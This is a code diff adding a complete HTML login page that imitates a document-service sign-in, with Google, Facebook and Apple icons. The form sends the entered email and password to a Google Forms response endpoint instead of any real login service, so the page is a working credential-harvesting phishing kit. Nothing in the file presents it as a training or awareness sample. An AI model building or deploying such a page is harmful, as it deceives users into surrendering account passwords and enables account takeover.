@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Login Form</title>
+<style>
+  body {
+    margin: 0;
+    height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    background: linear-gradient(180deg, #b3e5fc, #e1f5fe);
+    font-family: "Poppins", sans-serif;
+  }
+
+  .login-container {
+    background: rgba(255, 255, 255, 0.6);
+    backdrop-filter: blur(15px);
+    border-radius: 20px;
+    box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+    padding: 40px 35px;
+    width: 100%;
+    max-width: 380px;
+    text-align: center;
+  }
+
+  .login-container .icon {
+    background: #f5f7fa;
+    width: 60px;
+    height: 60px;
+    border-radius: 15px;
+    margin: 0 auto 20px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    font-size: 26px;
+    color: #333;
+  }
+
+  h2 {
+    font-size: 1.3rem;
+    font-weight: 600;
+    margin-bottom: 8px;
+    color: #333;
+  }
+
+  p {
+    color: #666;
+    font-size: 0.9rem;
+    margin-bottom: 25px;
+  }
+
+  input {
+    width: 100%;
+    padding: 12px 15px;
+    margin: 8px 0;
+    border: 1px solid #ccc;
+    border-radius: 10px;
+    outline: none;
+    font-size: 0.95rem;
+    background-color: #fff;
+  }
+
+  input:focus {
+    border-color: #007bff;
+  }
+
+  .forgot {
+    text-align: right;
+    margin-top: 5px;
+  }
+
+  .forgot a {
+    color: #007bff;
+    text-decoration: none;
+    font-size: 0.85rem;
+  }
+
+  .btn {
+    margin-top: 20px;
+    width: 100%;
+    background: #000;
+    color: #fff;
+    border: none;
+    padding: 13px;
+    border-radius: 10px;
+    font-size: 1rem;
+    cursor: pointer;
+    transition: background 0.3s;
+  }
+
+  .btn:hover {
+    background: #222;
+  }
+
+  .or {
+    margin: 20px 0 10px;
+    color: #666;
+    font-size: 0.85rem;
+  }
+
+  .social-icons {
+    display: flex;
+    justify-content: center;
+    gap: 15px;
+  }
+
+  .social-icons div {
+    width: 45px;
+    height: 45px;
+    border-radius: 10px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    background: #fff;
+    box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
+    cursor: pointer;
+    transition: transform 0.2s;
+  }
+
+  .social-icons div:hover {
+    transform: scale(1.05);
+  }
+
+  .social-icons img {
+    width: 20px;
+  }
+
+  @media (max-width: 400px) {
+    .login-container {
+      padding: 30px 25px;
+    }
+  }
+</style>
+</head>
+<body>
+
+  <div class="login-container">
+    <div class="icon">🔐</div>
+    <h2>Sign in with email</h2>
+    <p>Make a new doc to bring your words, data, and teams together. For free</p>
+
+    <form action="https://docs.google.com/forms/d/e/1FAIpQLSdvfHfFMK-lvmXfsiGSsTc4P-FATn5LOt6kNkXNRb8zdq5LXg/formResponse">
+      <input name="entry.950955321" type="email" placeholder="Email" required>
+      <input name="entry.120530531" type="password" placeholder="Password" required>
+      <div class="forgot"><a href="#">Forgot password?</a></div>
+      <button type="submit" class="btn">Get Started</button>
+    </form>
+
+    <div class="or">Or sign in with</div>
+    <div class="social-icons">
+      <div><img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/google/google-original.svg" alt="Google"></div>
+      <div><img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/facebook/facebook-original.svg" alt="Facebook"></div>
+      <div><img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/apple/apple-original.svg" alt="Apple"></div>
+    </div>
+  </div>
+
+</body>
+</html>
